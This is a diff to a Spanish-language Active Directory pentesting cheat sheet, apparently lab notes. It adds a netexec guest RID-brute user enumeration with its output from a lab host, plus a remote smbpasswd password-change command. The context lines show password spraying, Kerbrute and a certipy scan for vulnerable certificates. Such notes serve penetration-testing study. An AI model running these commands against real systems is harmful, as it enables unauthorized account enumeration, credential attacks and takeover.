@@ -500,6 +500,30 @@ rpcclient $> querydispinfo
 
 ---
 
+## 🔎 Encontrar Usuarios
+
+```bash
+netexec smb 192.168.69.9 -u "guest" -p ""   --rid-brute
+
+
+SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
+SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\guest: (Guest)
+SMB         192.168.69.9    445    FOLCLORE         500: FOLCLORE\Administrador (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         501: FOLCLORE\Invitado (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         503: FOLCLORE\DefaultAccount (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         504: FOLCLORE\WDAGUtilityAccount (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         513: FOLCLORE\Ninguno (SidTypeGroup)
+SMB         192.168.69.9    445    FOLCLORE         1001: FOLCLORE\Quetzalcoatl (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         1003: FOLCLORE\El_charro_negro (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         1004: FOLCLORE\Ix_Chel (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         1005: FOLCLORE\Tlaloc (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         1006: FOLCLORE\La_mulata_de_Cordoba (SidTypeUser)
+SMB         192.168.69.9    445    FOLCLORE         1007: FOLCLORE\La_Catrina (SidTypeUser)
+``` 
+
+
+---
+
 ## 🔎 Craquear Constreñas 
 
 ```bash netexec smb 192.168.69.69 -u usuarios.txt -p ah.txt --continue-on-success | grep "+"
@@ -817,7 +841,13 @@ Lo interesante de Kerbrute es que no requiere autenticación previa, solo acceso
 
 
 ---
+# 🔐 Cambiar la contraseña de Usuarios
 
+```bash
+smbpasswd -r 192.168.56.107 -U "svcapp1"
+```
+
+---
 
 
 certipy-ad find -u 'svcapp1' -p 'Hola1234$' -dc-ip 10.0.2.6 -vulnerable -stdout
